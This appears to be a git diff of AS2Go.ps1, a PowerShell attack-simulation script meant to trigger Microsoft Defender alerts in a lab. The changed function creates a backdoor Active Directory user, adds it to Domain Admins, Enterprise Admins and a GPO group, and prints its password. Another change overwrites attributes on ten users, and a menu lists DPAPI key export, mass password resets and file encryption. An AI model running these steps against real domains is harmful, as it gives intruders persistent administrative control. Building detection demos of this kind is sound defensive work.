@@ -19,8 +19,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-09-29
-File Name  : AS2Go.ps1 | Version 2.0.9
+last update: 2022-10-08
+File Name  : AS2Go.ps1 | Version 2.1.0
 Author     : Holger Zimmermann | holgerz@semperis.com | @HerrHozi
 
 
@@ -45,6 +45,7 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
+# 2022-10-08 | v2.1.0 |  Update Function New-BackDoorUser (line 596)
 # 2022-09-20 | v2.0.9 |  Update Get-LocalGroupMember -Group "Administrators" | ft
 # 2022-09-20 | v2.0.8 |  Update Function New-BackDoorUser
 # 2022-09-09 | v2.0.7 |  Update Function Start-AS2GoDemo
@@ -66,8 +67,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-$lastupdate   = "2022-09-29"
-$version      = "2.0.9.000" 
+$lastupdate   = "2022-10-08"
+$version      = "2.1.0.000" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
@@ -334,8 +335,9 @@ Write-Log -Message "### Start Function $myfunction ###"
             Pause
 
             Access-Directory -directory "\\$mydc\c$\*.*"
-            Get-ADUser -filter * -SearchBase $MySearchBase | select -first 10  | ft
             Get-ADUser -filter * -SearchBase $MySearchBase | select -first 10  | Set-ADUser –replace @{info=”$sFakeUser was here”}
+            get-ADUser -filter * -SearchBase $MySearchBase -Properties * | select sAMAccountName, whenChanged, Displayname, info | select -first 10 | ft
+            
             Write-Host ""
             Pause
             }
@@ -563,34 +565,56 @@ $title              = "Backdoor User"
 $sUserPrincipalName =  ($sSamaccountName + $sUPNSuffix)
 $TimeSpan           =  New-TimeSpan -Days 7 -Hours 0 -Minutes 0 #Account expires after xx Days
 $bthumbnailPhoto    = ".\AS2Go_BD-User.jpg"
-$sDescription       = "AS2GO Demo | Backdoor User"
+$sDescription       = "Backdoor User (AS2Go Demo)"
 
-$BDUserPW = Get-RandomPassword
+$BDUserPW            = Get-RandomPassword
 $global:BDSecurePass = ConvertTo-SecureString -String $BDUserPW -AsPlainText -Force
 $global:BDUser       = $sSamaccountName
 
 $MyDC =  Get-KeyValue -key "mydc"
 
-new-aduser -Server $MyDC -UserPrincipalName $sUserPrincipalName -Name $sName -SamAccountName $sSamaccountName -GivenName $sFirstName -Surname $sLastname -DisplayName $sDisplayName -PasswordNeverExpires $false -Path $sPath -AccountPassword $global:BDSecurePass -PassThru | Enable-ADAccount
+#new-aduser -Server $MyDC -UserPrincipalName $sUserPrincipalName -Name $sName -SamAccountName $sSamaccountName -GivenName $sFirstName -Surname $sLastname -DisplayName $sDisplayName -PasswordNeverExpires $false -Path $sPath -AccountPassword $global:BDSecurePass -PassThru | Enable-ADAccount
+new-aduser -UserPrincipalName $sUserPrincipalName -Name $sName -SamAccountName $sSamaccountName -GivenName $sFirstName -Surname $sLastname -DisplayName $sDisplayName -PasswordNeverExpires $false -AccountPassword $global:BDSecurePass -PassThru | Enable-ADAccount
 
 
-Add-ADGroupMember -Identity $GroupDA -Members $sSamaccountName -Server $MyDC
-Add-ADGroupMember -Identity $GroupEA -Members $sSamaccountName -Server $MyDC
-Add-ADGroupMember -Identity $GroupGPO -Members $sSamaccountName -Server $MyDC  
+Add-ADGroupMember -Identity $GroupDA  -Members $sSamaccountName #-Server $MyDC
+Add-ADGroupMember -Identity $GroupGPO -Members $sSamaccountName #-Server $MyDC  
+
+
+Try {
+  Add-ADGroupMember -Identity $GroupEA  -Members $sSamaccountName 
+}
+
+Catch {
+# do nothing due to group is located in root domain
+}
+
 
 Set-ADUser $sSamaccountName -Replace @{thumbnailPhoto=([byte[]](Get-Content $bthumbnailPhoto -Encoding byte))} -Initials $Initials -Title $title -Description $sDescription
-
-
 Set-KeyValue -key "LastBDUser" -NewValue $sSamaccountName
 
+Write-Host "`n`nNew backdoor user: " -NoNewline;  Write-host $sSamaccountName  -ForegroundColor Yellow
+Write-host     "current password : " -NoNewline;  Write-host $BDUserPW         -ForegroundColor Yellow
+
+Start-Sleep -Milliseconds 500
+#Get-ADUser -Identity $sSamaccountName -Properties canonicalName, Created,  | select sAMAccountName, Created, userPrincipalName, name, canonicalName | ft
+Get-ADUser -Identity $sSamaccountName -Properties * | select Created, canonicalName, userAccountControl, title, userPrincipalName | ft
 
 
-Write-Host "`n`nSUMMARY:" -ForegroundColor Green
-Write-Host     "========" -ForegroundColor Green
-Start-Sleep -Milliseconds 500
-Get-ADUser -Server $MyDC -Identity $sSamaccountName -Properties canonicalName, Created  | select sAMAccountName, Created, userPrincipalName, name, canonicalName | ft
-Start-Sleep -Milliseconds 500
-Get-ADPrincipalGroupMembership -Server $MyDC -Identity $sSamaccountName | ft
+
+Write-Host "Getting AD Principal Group Membership`n" -ForegroundColor Yellow
+
+$i=0
+
+Do {
+   $i += 1
+   $members = Get-ADPrincipalGroupMembership -Identity $sSamaccountName
+   Write-host "." -NoNewline -ForegroundColor Yellow
+} Until (($members.count -gt 3) -or ($i -gt 50))
+
+Write-Host ""
+
+Get-ADPrincipalGroupMembership -Identity $sSamaccountName | ft name, GroupCategory, GroupScope, sid
 
 #### create credentional for further actions
 $global:BDCred = New-Object System.Management.Automation.PSCredential $sUserPrincipalName, $global:BDSecurePass
@@ -1037,7 +1061,10 @@ $MyKey       = @("myDC",`
 # list the current values
 for ($counter = 0; $counter -lt $MyParameter.Length; $counter++ )
 {
-    write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor Yellow
+    
+    
+    write-host ([string]$counter).PadLeft(4,' ') ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter)
+    #write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor Yellow
 }
 
 
@@ -1233,8 +1260,9 @@ Write-Host ""
 Write-Host "Get-ADGroupMember -Identity $globalHelpDesk -Recursive | ft" -ForegroundColor $global:FGCCommand
 Write-Host ""
 Get-SensitveADUser -group $globalHelpDesk
-#dsquery group -samid "$globalHelpDesk" | dsget group -members -expand
-Pause
+#Pause
+#Invoke-Item .\POI.png
+pause
 Clear-Host
 
 Write-Host "____________________________________________________________________`n" 
@@ -1815,9 +1843,9 @@ $lastVictim   = Get-KeyValue -key "LastVictim"
 $lastRun      = Get-KeyValue -key "LastStart" 
 $lastDuration = Get-KeyValue -key "LastDuration" 
 
-Write-Host "`nCurrent Date & Time: $TimeStamp" 
+Write-Host "`n  Current Date & Time: $TimeStamp" 
 Write-Host ""
-Write-Host "Last Run:            " -NoNewline
+Write-Host "  Last Run:            " -NoNewline
 Write-Host $lastRun                -NoNewline -ForegroundColor $global:FGCHighLight
 Write-Host " | "                   -NoNewline
 Write-Host $lastDuration           -NoNewline -ForegroundColor $global:FGCHighLight
@@ -2203,7 +2231,7 @@ Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "          Attack Level - DOMAIN COMPROMISED AND PERSISTENCE         "
 Write-Host "                                                                    "
-Write-Host "            #1 - create back door user                              "
+Write-Host "            #1 - create backdoor user                              "
 Write-Host "            #2 - export DPAPI master key                            "
 Write-Host "            #3 - PW reset and disable users                         "
 Write-Host "            #4 - Encrypt files                                      "
@@ -2221,7 +2249,7 @@ If ($answer -eq $yes)
     
 
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "        Create Back Door User and Add to Sensitive Groups           "
+    Write-Host "        Create backdoor USER and add it to Sensitive Groups           "
     Write-Host "____________________________________________________________________`n"     
     
     $question = "`nDo you want to run this step - Y or N? Default "
